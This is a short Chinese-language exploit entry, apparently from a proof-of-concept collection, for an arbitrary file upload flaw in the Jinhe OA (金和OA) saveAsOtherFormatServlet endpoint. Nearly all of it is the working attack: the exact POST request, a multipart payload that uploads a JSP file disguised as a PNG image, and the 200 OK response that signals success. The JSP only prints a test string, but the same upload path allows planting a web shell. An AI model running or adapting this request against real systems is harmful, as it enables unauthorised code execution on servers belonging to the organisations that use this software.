# 金和OAsaveAsOtherFormatServlet文件上传

金和OA ｜ 文件上传 ｜ —
- **请求**：`POST /jc6/servlet/saveAsOtherFormatServlet?fileName=dudesuite.jsp HTTP/1.1`

**Payload**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="FileBlod";filename="dudesuite.jsp"
Content-Type: image/png
<% out.println("111");%>
------WebKitFormBoundary
```
- **响应特征**：200 OK